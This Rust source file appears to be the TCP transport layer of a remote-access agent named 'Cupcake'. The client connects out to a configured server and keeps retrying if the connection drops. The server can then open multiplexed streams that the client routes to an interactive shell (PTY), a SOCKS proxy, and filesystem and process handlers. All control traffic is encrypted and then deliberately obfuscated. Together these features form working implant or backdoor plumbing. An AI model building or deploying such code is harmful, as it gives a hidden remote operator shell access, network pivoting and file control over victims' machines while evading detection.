// TCP 传输层实现
//
// 提供基于原始 TCP 套接字的传输层实现，使用 Yamux 多路复用。

use crate::backoff::ExponentialBackoff;
use crate::config::get_aes_key;
use crate::crypto;
use crate::error::{ClientError, Result};
use crate::transport::Transport;
use async_trait::async_trait;
use std::io::Write;
use tokio::io::{AsyncReadExt as _, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::sleep;
use tokio_util::compat::{FuturesAsyncReadCompatExt, TokioAsyncReadCompatExt};
use yamux::{Config, Connection, Mode, WindowUpdateMode};

/// TCP 传输实现
pub struct TcpTransport {
    url: String,
    control_stream: Option<tokio_util::compat::Compat<yamux::Stream>>,
    aes_key: Vec<u8>,
    backoff: ExponentialBackoff,
}

impl TcpTransport {
    pub fn new(url: String) -> Self {
        let aes_key = get_aes_key();
        Self {
            url,
            control_stream: None,
            aes_key,
            backoff: ExponentialBackoff::default(),
        }
    }
    
    fn parse_url(&self) -> Result<(String, u16)> {
        let full_url = if !self.url.contains("://") {
            format!("tcp://{}", self.url)
        } else {
            self.url.clone()
        };
        let rest = full_url.split("://").nth(1).ok_or_else(|| {
            ClientError::ConnectionError(format!("Invalid URL format: {}", self.url))
        })?;
        let addr = rest.split('/').next().unwrap_or(rest);
        let parts: Vec<&str> = addr.split(':').collect();
        if parts.len() != 2 {
            return Err(ClientError::ConnectionError(format!("Invalid TCP address: {}", addr)));
        }
        let host = parts[0].to_string();
        let port = parts[1].parse::<u16>().map_err(|e| ClientError::ConnectionError(e.to_string()))?;
        Ok((host, port))
    }
}

#[async_trait]
impl Transport for TcpTransport {
    async fn connect(&mut self) -> Result<()> {
        let (host, port) = self.parse_url()?;
        let addr = format!("{}:{}", host, port);
        
        loop {
            crate::utils::db_print(&format!("Connecting to {}...", addr));
            match TcpStream::connect(&addr).await {
                Ok(stream) => {
                    // 🛡️ [Hardening] Configure low-level socket options
                    if let Ok(std_stream) = stream.into_std() {
                        let socket = socket2::Socket::from(std_stream);
                        let _ = socket.set_keepalive(true);
                        let _ = socket.set_tcp_nodelay(true);
                        let _ = socket.set_linger(Some(std::time::Duration::from_secs(2)));
                        
                        // Re-wrap into tokio stream
                        let stream = match TcpStream::from_std(socket.into()) {
                            Ok(s) => s,
                            Err(_) => {
                                crate::utils::db_print("[Cupcake] Failed to re-wrap TCP stream");
                                continue;
                            }
                        };
                        crate::utils::db_print("[Cupcake] TCP hardened socket ready.");
                    
                        let mut yamux_config = Config::default();
                        // 缓冲区大小：16MB（足够大文件传输，但不会 OOM）
                        yamux_config.set_max_buffer_size(16 * 1024 * 1024);
                        yamux_config.set_receive_window(16 * 1024 * 1024);
                        yamux_config.set_window_update_mode(WindowUpdateMode::OnRead);
                        
                        let compat_stream = stream.compat();
                        let mut connection = Connection::new(compat_stream, yamux_config, Mode::Client);
                        let mut control = connection.control();

                        // 🛠 全功能多路复用调度器 (带并发限制)
                        tokio::spawn(async move {
                            crate::utils::db_print("[Yamux] Connection driver started.");
                            // 限制并发流数量，防止资源耗尽
                            let stream_semaphore = std::sync::Arc::new(tokio::sync::Semaphore::new(16));
                            loop {
                                match connection.next_stream().await {
                                    Ok(Some(stream)) => {
                                        let stream_id = stream.id();
                                        crate::utils::db_print(&format!("[Yamux] New stream incoming. ID: {}", stream_id));
                                        let permit = match stream_semaphore.clone().try_acquire_owned() {
                                            Ok(p) => p,
                                            Err(_) => {
                                                crate::utils::db_print(&format!("[Yamux] Stream {} rejected: max concurrency reached", stream_id));
                                                drop(stream); // Close the stream
                                                continue;
                                            }
                                        };
                                        tokio::spawn(async move {
                                            let _permit = permit; // Hold permit until task completes
                                            use futures_util::AsyncReadExt as _; 
                                            let mut stream = stream;
                                            let mut type_buf = [0u8; 1];
                                            if let Err(e) = stream.read_exact(&mut type_buf).await { 
                                                crate::utils::db_print(&format!("[Yamux] Failed to read stream type for ID {}: {}", stream_id, e));
                                                return; 
                                            }
                                            
                                            crate::utils::db_print(&format!("[Yamux] Stream {} Type: 0x{:02X}", stream_id, type_buf[0]));
                                            match type_buf[0] {
                                                0x01 => { 
                                                    crate::utils::db_print(&format!("[Yamux] Routing to PTY handler (Stream {})", stream_id));
                                                    let _ = std::io::stdout().flush();
                                                    crate::pty::handle_stream(stream).await; 
                                                    crate::utils::db_print(&format!("[Yamux] PTY handler returned (Stream {})", stream_id));
                                                }
                                                0x02 => { crate::socks::handle_stream(stream).await; }
                                                0x03 => { crate::fs::handle_stream(stream).await; }
                                                0x04 => { crate::process::handle_stream(stream).await; }
                                                _ => { crate::utils::db_print(&format!("[Yamux] Unknown type: 0x{:02X}", type_buf[0])); }
                                            }
                                        });
                                    }
                                    Ok(None) => {
                                        crate::utils::db_print("[Yamux] Connection driver reached EOF.");
                                        break;
                                    }
                                    Err(e) => {
                                        crate::utils::db_print(&format!("[Yamux] Connection driver error: {}", e));
                                        break;
                                    }
                                }
                            }
                        });

                        let control_stream = match tokio::time::timeout(std::time::Duration::from_secs(10), control.open_stream()).await {
                            Ok(Ok(s)) => s,
                            _ => return Err(ClientError::ConnectionError("Yamux control failed".into())),
                        };
                        
                        crate::utils::db_print("[Cupcake] Control established.");
                        self.control_stream = Some(control_stream.compat());
                        self.backoff.reset();
                        return Ok(());
                    } else {
                        crate::utils::db_print("[Cupcake] Socket hardening failed, retrying...");
                        let delay = self.backoff.next_delay();
                        sleep(delay).await;
                    }
                }
                Err(e) => {
                    let delay = self.backoff.next_delay();
                    crate::utils::db_print(&format!("Retry in {:?}: {}", delay, e));
                    sleep(delay).await;
                }
            }
        }
    }
    
    async fn send(&mut self, data: &[u8]) -> Result<()> {
        let stream = self.control_stream.as_mut().ok_or_else(|| ClientError::ConnectionError("No stream".into()))?;
        let encrypted = crypto::encrypt(data, &self.aes_key);
        let obfuscated = crypto::obfuscate_packet(encrypted);
        let len = obfuscated.len() as u32;
        stream.write_u32(len).await.map_err(|e| ClientError::ConnectionError(e.to_string()))?;
        stream.write_all(&obfuscated).await.map_err(|e| ClientError::ConnectionError(e.to_string()))?;
        stream.flush().await.map_err(|e| ClientError::ConnectionError(e.to_string()))?;
        Ok(())
    }
    
    async fn receive(&mut self) -> Result<Vec<u8>> {
        let stream = self.control_stream.as_mut().ok_or_else(|| ClientError::ConnectionError("No stream".into()))?;
        
        // 🛡️ Read timeout: detect half-open connections (server silently died)
        // If no data arrives within 120s, assume connection is dead and trigger reconnect
        let len = match tokio::time::timeout(
            std::time::Duration::from_secs(120),
            stream.read_u32()
        ).await {
            Ok(Ok(l)) => l as usize,
            Ok(Err(e)) => return Err(ClientError::ConnectionError(e.to_string())),
            Err(_) => return Err(ClientError::ConnectionError("Read timeout (half-open)".into())),
        };
        
        if len > 100 * 1024 * 1024 { return Err(ClientError::ConnectionError("Too big".into())); }
        let mut buffer = vec![0u8; len];
        stream.read_exact(&mut buffer).await.map_err(|e| ClientError::ConnectionError(e.to_string()))?;
        let deobfuscated = crypto::deobfuscate_packet(buffer);
        let plaintext = crypto::decrypt(&deobfuscated, &self.aes_key)
            .map_err(|e| ClientError::ConnectionError(format!("Decryption error: {}", e)))?;
        Ok(plaintext)
    }
    
    fn is_connected(&self) -> bool { self.control_stream.is_some() }
    fn initialize(&mut self, _id: &str) {}
}
